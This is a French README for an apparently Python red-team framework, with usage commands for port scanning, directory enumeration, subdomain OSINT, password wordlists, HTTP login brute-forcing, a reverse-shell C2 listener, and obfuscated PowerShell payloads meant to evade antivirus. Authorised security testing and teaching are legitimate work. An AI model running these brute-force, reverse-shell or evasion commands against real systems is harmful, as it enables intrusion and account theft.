---

### Le nouveau fichier `README.md`

```markdown
# ⚔️ Red_Framework (Arsenal)

Un framework d'automatisation Red Team développé en Python, orienté opérations asynchrones, OSINT et post-exploitation. Conçu pour la vitesse, la modularité et la furtivité.

⚠️ **Avertissement Légal :** Cet outil a été développé à des fins d'éducation en cybersécurité (DevSecOps Lab) et pour une utilisation lors d'audits Red Team autorisés. L'utilisation de cet outil contre des cibles sans consentement écrit est strictement interdite.

## 🛠️ Installation

```powershell
# Cloner le dépôt
git clone [https://github.com/votre-nom/Red_Framework.git](https://github.com/votre-nom/Red_Framework.git)
cd Red_Framework

# Installer les dépendances
pip install -r requirements.txt

```

## 🚀 Utilisation & Modules

Affichez l'aide globale à tout moment avec `python arsenal.py -h` ou l'aide spécifique d'un module avec `python arsenal.py <module> -h`.

---

### 1. Scanner de Ports Furtif (`scan`)

Cartographie asynchrone des services exposés (TCP Full Connect) avec Banner Grabbing et résolution de services (via `core/ports_db.py`).

* **Options :**
* `-T`, `--target` *(Requis)* : IP ou Domaine cible.
* `-s`, `--start` *(Optionnel)* : Port de début (défaut: 1).
* `-e`, `--end` *(Optionnel)* : Port de fin (défaut: 1024).
* `-t`, `--threads` *(Optionnel)* : Nombre de sockets simultanés (défaut: 100).


* **Exemple :**
```powershell
python arsenal.py scan -T 127.0.0.1 -s 1 -e 8500 -t 200

```



### 2. Énumération Web Asynchrone (`enum`)

Découverte agressive de répertoires et fichiers cachés. Supporte l'ajout d'extensions à la volée.

* **Options :**
* `-u`, `--url` *(Requis)* : URL cible (ex: https://www.google.com/search?q=http://cible.com).
* `-w`, `--wordlist` *(Requis)* : Chemin vers le fichier d'attaque.
* `-e`, `--extensions` *(Optionnel)* : Extensions à ajouter (ex: .bak,.txt,.php).
* `-t`, `--threads` *(Optionnel)* : Nombre de requêtes simultanées (défaut: 20).


* **Exemple :**
```powershell
python arsenal.py enum -u [http://127.0.0.1:8080](http://127.0.0.1:8080) -w mots.txt -e .bak,.old -t 50

```



### 3. Reconnaissance OSINT de Sous-domaines (`subdomain`)

Découverte furtive de sous-domaines via l'API publique de Certificate Transparency (crt.sh). N'envoie aucun paquet à la cible.

* **Options :**
* `-d`, `--domain` *(Requis)* : Domaine racine cible.


* **Exemple :**
```powershell
python arsenal.py subdomain -d defcon.org

```



### 4. Génération de Dictionnaire (`wordlist`)

Forge une liste de mots de passe mutés (Leet Speak, années) optimisée pour l'ingénierie sociale sur la cible.

* **Options :**
* `-k`, `--keywords` *(Requis)* : Mots-clés séparés par des virgules.


* **Exemple :**
```powershell
python arsenal.py wordlist -k "entreprise,admin,2024"

```



### 5. Brute-Force HTTP POST (`brute`)

Attaque asynchrone par force brute sur des formulaires de connexion.

* **Options :**
* `-u`, `--url` *(Requis)* : URL du formulaire de login.
* `-user`, `--username` *(Requis)* : Nom de l'utilisateur ciblé.
* `-w`, `--wordlist` *(Requis)* : Dictionnaire de mots de passe à tester.
* `-t`, `--threads` *(Optionnel)* : Nombre de requêtes (défaut: 10).


* **Exemple :**
```powershell
python arsenal.py brute -u [http://cible.com/login](http://cible.com/login) -user admin -w custom_pass.txt

```



### 6. Serveur Command & Control (`c2`)

Serveur d'écoute local permettant d'intercepter les Reverse Shells lors de la phase de post-exploitation.

* **Options :**
* `-l`, `--listen` *(Optionnel)* : IP d'écoute (défaut: 0.0.0.0).
* `-p`, `--port` *(Optionnel)* : Port d'écoute (défaut: 4444).


* **Exemple :**
```powershell
python arsenal.py c2 -l 0.0.0.0 -p 4444

```



### 7. Usine à Payloads (`payload`)

Génère des One-Liners obfusqués pour contourner les analyses statiques d'AV/EDR (PowerShell Base64).

* **Options (L'une des deux est requise) :**
* `-c`, `--cmd` : Commande système en clair à encoder.
* `--revshell` : IP:PORT de votre C2 pour générer un agent de connexion de test.


* **Exemples :**
```powershell
python arsenal.py payload -c "whoami"
python arsenal.py payload --revshell 192.168.1.50:4444

```



## 🏗️ Architecture

* `arsenal.py` : Routeur CLI principal.
* `core/` : Configurations (`config.py`) et Base de données de signatures (`ports_db.py`).
* `modules/` : Scripts d'attaque autonomes.
